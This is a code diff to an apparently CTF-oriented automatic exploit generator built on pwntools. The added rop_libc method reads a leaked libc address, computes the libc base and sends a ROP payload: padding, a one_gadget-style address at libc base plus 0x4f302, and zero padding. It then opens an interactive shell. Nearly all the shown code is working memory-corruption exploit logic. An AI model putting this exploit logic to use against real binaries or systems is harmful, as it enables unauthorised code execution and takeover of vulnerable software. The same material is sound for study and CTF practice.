@@ -19,8 +19,8 @@ context.update(
     endian="little",
     log_level="warning",
     os="linux",
-    terminal=["tmux", "split-window", "-h", "-p 65"]
-    #terminal=["st"]
+    #terminal=["tmux", "split-window", "-h", "-p 65"]
+    terminal=["st"]
 )
 
 # Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
@@ -34,6 +34,7 @@ class Raeg:
     # Initialize class variables that are important here
     def __init__(self, binary_path, libc_path):
         self.binary = binary_path
+        self.libc_path = libc_path
         self.elf = context.binary = ELF(binary_path)
         self.libc = context.binary = ELF(libc_path)
 
@@ -417,27 +418,42 @@ class Raeg:
 
         return chain
 
+
     def rop_libc(self):
         p = process(self.binary)
+
+        gs = '''
+            init-pwndbg
+        '''
+
+        #p = gdb.debug(self.binary,gdbscript=gs)
 
         f = open("./format.txt", "w+")
         f.write(self.libc_offset_string + "\n")
         f.close()
 
-
+        chain = b""
 
         prompt = p.recvline()
         if b"Leak" in prompt:
             self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
             log.info(f"Libc address leaked {hex(self.leak)}")
             self.resolve_libc_offset()
+
+            self.libc.address = self.leak + self.libc_offset
+
+            chain += self.symbolic_padding
+            chain += p64(self.libc.address+0x4f302)
+            chain += p64(0) * 256
+
         else:
             if self.libc_offset_string != None:
                 p.sendline(bytes(self.libc_offset_string, "utf-8"))
 
                 self.resolve_libc_offset()
 
-
+        p.sendline(chain)
+        p.interactive()
 
     def generate_rop_chain(self):
 
@@ -445,7 +461,7 @@ class Raeg:
             #Perform a write primitive
             print(self.has_libc_leak)
             if self.has_libc_leak == True:
-                self.rop_libc()
+                self.rop_chain = self.rop_libc()
             else:
                 self.rop_chain = self.rop_chain_write_string()
                 self.chain_length += len(self.rop_chain)
@@ -495,7 +511,6 @@ class Raeg:
                     libc_leak = re.search(r"0x7f[a-f0-9]+34a", address)
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
-                        print(self.libc_offset_string)
                         self.has_libc_leak = True
                         logging.getLogger("pwnlib").setLevel(logging.INFO)
                         log.info(f"Found libc leak for libc_start_main at offset {i}:{address}")
@@ -586,8 +601,9 @@ class Raeg:
 
         self.libc_offset = libc_base_address - leak_address
 
-        print("Cleaning disgusting r2 shit off of screen")
-        os.system("clear")
+        #print("Cleaning disgusting r2 shit off of screen")
+        #os.system("clear")
+        log.info(f"Found libc offset {self.libc_offset}")
         print(self.libc_offset)
 
 
